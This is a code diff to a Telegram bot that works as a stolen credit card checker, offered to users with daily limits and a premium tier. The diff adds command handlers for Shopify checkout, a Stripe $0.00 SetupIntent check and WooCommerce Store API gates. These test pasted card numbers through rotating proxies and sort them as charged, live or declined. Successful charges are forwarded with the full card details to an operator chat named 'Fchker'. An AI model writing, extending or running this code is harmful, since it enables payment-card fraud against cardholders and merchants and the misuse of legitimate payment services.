@@ -48,6 +48,7 @@ from gates.auth import (
     check_card_au,
     check_card_dila,
     check_card_nemaneide,
+    check_card_setupintent,
     check_card_inu,
     check_card_brccn
 )
@@ -66,6 +67,8 @@ from gates.charge import (
     check_card_clover,
     check_card_authorize,
     check_card_autoshopify,
+    check_card_shopify,
+    check_card_storeapi,
     check_card_sk,
     validate_stripe_sk
 )
@@ -2128,8 +2131,8 @@ async def process_shp10_cmd(event):
     await status_msg.edit(res, parse_mode="html")
 
 
-# ==================== AUTO SHOPIFY CHARGE (sh) ENGINE ====================
-@bot.on(events.NewMessage(pattern=r'(?i)^[./]sh(?:\s+([\s\S]+))?$'))
+# ==================== SHOPIFY ONE-PAGE / AUTO CHARGE (sh, sho) ENGINE ====================
+@bot.on(events.NewMessage(pattern=r'(?i)^[./](?:sh|sho)(?:\s+([\s\S]+))?$'))
 async def process_autoshopify_cmd(event):
     user_id = event.sender_id
     if not await is_joined_channel(user_id):
@@ -2142,6 +2145,11 @@ async def process_autoshopify_cmd(event):
         return
 
     card_input = event.pattern_match.group(1)
+    if not card_input and event.is_reply:
+        reply_msg = await event.get_reply_message()
+        if reply_msg and reply_msg.text:
+            card_input = reply_msg.text
+
     if not card_input:
         await event.reply("⚠️ Format: `/sh cc|mm|yy|cvv`")
         return
@@ -2162,39 +2170,197 @@ async def process_autoshopify_cmd(event):
         await event.reply("⚠️ Format: `/sh cc|mm|yy|cvv`")
         return
 
-    status_msg = await event.reply("🔄 <b>Checking (Auto shopify(0.10$ - 5.00$))...</b>", parse_mode="html")
+    status_msg = await event.reply("🔄 <b>Checking (Shopify Vault & Checkout)...</b>", parse_mode="html")
     proxies = load_proxies(user_id)
     proxy = random.choice(proxies) if proxies else None
 
     start_time = time.time()
     try:
-        st, response_msg, gateway_str = await check_card_autoshopify(card, proxy_str=proxy)
+        st, response_msg, brand_detected = await check_card_shopify(cc, mm, yy, cvc, proxy_url=proxy)
+        if st == "error" and "proxy" not in response_msg.lower():
+            st_fb, response_msg_fb, _ = await check_card_autoshopify(card, proxy_str=proxy)
+            if st_fb != "error":
+                st, response_msg = st_fb, response_msg_fb
+
         time_taken = round(time.time() - start_time, 2)
         update_daily_usage(user_id, 1)
 
         cc_num = card.split('|')[0]
         try:
             brand, bin_type, level, bank, country, flag = await get_bin_info(cc_num[:6])
+            if brand == "-" or not brand:
+                brand = brand_detected
         except Exception:
-            brand, bin_type, level, bank, country, flag = "-", "-", "-", "-", "-", "🏳️"
+            brand, bin_type, level, bank, country, flag = brand_detected, "-", "-", "-", "-", "🏳️"
 
         st_lower = str(st).lower()
-        if st_lower == 'charged':
+        if st_lower == 'charged' or "charged" in response_msg.lower():
             status_emoji = "Charged! 🟢"
         elif st_lower == 'approved':
             if "3DS" in response_msg or "OTP" in response_msg:
                 status_emoji = "Live! 🟡"
             else:
                 status_emoji = "Approved! ✅"
+        elif st_lower == 'live':
+            status_emoji = "Live! 🟡"
         else:
             status_emoji = "Declined! ❌"
 
-        res = format_anime_result(f"{cc}|{mm}|{yy}|{cvc}", status_emoji, response_msg, "Auto shopify(0.10$ - 5.00$)", brand, bin_type, level, bank, country, flag, time_taken, event.sender)
+        res = format_anime_result(f"{cc}|{mm}|{yy}|{cvc}", status_emoji, response_msg, "Shopify Checkout", brand, bin_type, level, bank, country, flag, time_taken, event.sender)
         await status_msg.edit(res, parse_mode="html")
 
         if st_lower == 'charged':
             try:
-                hit_log = f"""💳 <b>CHARGED HIT</b>\n<code>{card}</code>\nGateway: Auto shopify(0.10$ - 5.00$)\nResponse: {response_msg}\nUser: {user_id}"""
+                hit_log = f"""💳 <b>CHARGED HIT</b>\n<code>{card}</code>\nGateway: Shopify Checkout\nResponse: {response_msg}\nUser: {user_id}"""
+                await bot.send_message("Fchker", hit_log, parse_mode="html")
+            except:
+                pass
+    except Exception as e:
+        await status_msg.edit(f"❌ Error: {e}")
+
+
+# ==================== STRIPE $0.00 SETUPINTENT (st0, setup) ENGINE ====================
+@bot.on(events.NewMessage(pattern=r'(?i)^[./](?:st0|setup)(?:\s+([\s\S]+))?$'))
+async def process_st0_cmd(event):
+    user_id = event.sender_id
+    if not await is_joined_channel(user_id):
+        await event.reply("Join channel and /verify first!")
+        return
+
+    allowed, remaining = check_limits(user_id, False)
+    if not allowed:
+        await event.reply("Daily limit reached. Get premium.")
+        return
+
+    card_input = event.pattern_match.group(1)
+    if not card_input and event.is_reply:
+        reply_msg = await event.get_reply_message()
+        if reply_msg and reply_msg.text:
+            card_input = reply_msg.text
+
+    if not card_input:
+        await event.reply("⚠️ Format: `/st0 cc|mm|yy|cvv`")
+        return
+
+    cards = extract_cc(card_input)
+    if not cards:
+        await event.reply("⚠️ Format: `/st0 cc|mm|yy|cvv`")
+        return
+
+    card = cards[0]
+    parts = card.split('|')
+    try:
+        cc = parts[0].strip()
+        mm = parts[1].strip()
+        yy = parts[2].strip()
+        cvc = parts[3].strip()
+    except IndexError:
+        await event.reply("⚠️ Format: `/st0 cc|mm|yy|cvv`")
+        return
+
+    status_msg = await event.reply("🔄 <b>Checking (Stripe $0.00 SetupIntent)...</b>", parse_mode="html")
+    proxies = load_proxies(user_id)
+    proxy = random.choice(proxies) if proxies else None
+
+    start_time = time.time()
+    try:
+        st, response_msg, brand_detected = await check_card_setupintent(cc, mm, yy, cvc, proxy_url=proxy)
+        time_taken = round(time.time() - start_time, 2)
+        update_daily_usage(user_id, 1)
+
+        try:
+            brand, bin_type, level, bank, country, flag = await get_bin_info(cc[:6])
+            if brand == "-" or not brand:
+                brand = brand_detected
+        except Exception:
+            brand, bin_type, level, bank, country, flag = brand_detected, "-", "-", "-", "-", "🏳️"
+
+        st_lower = str(st).lower()
+        if st_lower in ('approved', 'succeeded', 'charged'):
+            status_emoji = "Approved! ✅"
+        elif st_lower == 'live' or "3ds" in response_msg.lower() or "challenge" in response_msg.lower():
+            status_emoji = "Live! 🟡"
+        else:
+            status_emoji = "Declined! ❌"
+
+        res = format_anime_result(f"{cc}|{mm}|{yy}|{cvc}", status_emoji, response_msg, "Stripe Auth -» $0.00", brand, bin_type, level, bank, country, flag, time_taken, event.sender)
+        await status_msg.edit(res, parse_mode="html")
+    except Exception as e:
+        await status_msg.edit(f"❌ Error: {e}")
+
+
+# ==================== WOOCOMMERCE STORE API DIRECT (ws) ENGINE ====================
+@bot.on(events.NewMessage(pattern=r'(?i)^[./](?:ws|storeapi)(?:\s+([\s\S]+))?$'))
+async def process_ws_cmd(event):
+    user_id = event.sender_id
+    if not await is_joined_channel(user_id):
+        await event.reply("Join channel and /verify first!")
+        return
+
+    allowed, remaining = check_limits(user_id, False)
+    if not allowed:
+        await event.reply("Daily limit reached. Get premium.")
+        return
+
+    card_input = event.pattern_match.group(1)
+    if not card_input and event.is_reply:
+        reply_msg = await event.get_reply_message()
+        if reply_msg and reply_msg.text:
+            card_input = reply_msg.text
+
+    if not card_input:
+        await event.reply("⚠️ Format: `/ws cc|mm|yy|cvv`")
+        return
+
+    cards = extract_cc(card_input)
+    if not cards:
+        await event.reply("⚠️ Format: `/ws cc|mm|yy|cvv`")
+        return
+
+    card = cards[0]
+    parts = card.split('|')
+    try:
+        cc = parts[0].strip()
+        mm = parts[1].strip()
+        yy = parts[2].strip()
+        cvc = parts[3].strip()
+    except IndexError:
+        await event.reply("⚠️ Format: `/ws cc|mm|yy|cvv`")
+        return
+
+    status_msg = await event.reply("🔄 <b>Checking (Woo Store API Direct)...</b>", parse_mode="html")
+    proxies = load_proxies(user_id)
+    proxy = random.choice(proxies) if proxies else None
+
+    start_time = time.time()
+    try:
+        st, response_msg, brand_detected = await check_card_storeapi(cc, mm, yy, cvc, proxy_url=proxy)
+        time_taken = round(time.time() - start_time, 2)
+        update_daily_usage(user_id, 1)
+
+        try:
+            brand, bin_type, level, bank, country, flag = await get_bin_info(cc[:6])
+            if brand == "-" or not brand:
+                brand = brand_detected
+        except Exception:
+            brand, bin_type, level, bank, country, flag = brand_detected, "-", "-", "-", "-", "🏳️"
+
+        st_lower = str(st).lower()
+        if st_lower == 'charged' or "charged" in response_msg.lower():
+            status_emoji = "Charged! 🟢"
+        elif st_lower == 'approved':
+            status_emoji = "Approved! ✅"
+        elif st_lower == 'live' or "3ds" in response_msg.lower() or "challenge" in response_msg.lower():
+            status_emoji = "Live! 🟡"
+        else:
+            status_emoji = "Declined! ❌"
+
+        res = format_anime_result(f"{cc}|{mm}|{yy}|{cvc}", status_emoji, response_msg, "Woo Store API Direct", brand, bin_type, level, bank, country, flag, time_taken, event.sender)
+        await status_msg.edit(res, parse_mode="html")
+
+        if st_lower == 'charged':
+            try:
+                hit_log = f"""💳 <b>CHARGED HIT</b>\n<code>{card}</code>\nGateway: Woo Store API Direct\nResponse: {response_msg}\nUser: {user_id}"""
                 await bot.send_message("Fchker", hit_log, parse_mode="html")
             except:
                 pass
@@ -2616,8 +2782,8 @@ async def checker_menu_handler(event):
     gates_msg = """<b>Gates Menu</b>
 
 Browse the available categories:
-• <b>Auth Gates:</b> 6
-• <b>Charge Gates:</b> 17
+• <b>Auth Gates:</b> 7
+• <b>Charge Gates:</b> 18
 • <b>Mass Checker:</b> 7"""
 
     buttons = [
@@ -2639,6 +2805,9 @@ Browse the available categories:
 async def auth_info_handler(event):
     auth_msg = """<b>AUTH GATES</b>
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+<b><i>Stripe Auth $0.00 (SetupIntent)</i></b>
+<code>/st0 cc|mm|yy|cvv</code> (or <code>/setup</code>)
+
 <b><i>Stripe Auth 1</i></b>
 <code>/au cc|mm|yy|cvv</code>
 
@@ -2673,8 +2842,11 @@ async def auth_info_handler(event):
 async def charge_info_handler(event):
     charge_msg = """<b>CHARGE GATES</b>
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-<b><i>Auto shopify(0.10$ - 5.00$)</i></b>
-<code>/sh cc|mm|yy|cvv</code>
+<b><i>Shopify Checkout (0.10$ - 20.00$)</i></b>
+<code>/sh cc|mm|yy|cvv</code> (or <code>/sho</code>)
+
+<b><i>Woo Store API Direct (< $20.00)</i></b>
+<code>/ws cc|mm|yy|cvv</code> (or <code>/storeapi</code>)
 
 <b><i>Shopify Charge ($10.00)</i></b>
 <code>/shp10 cc|mm|yy|cvv</code>
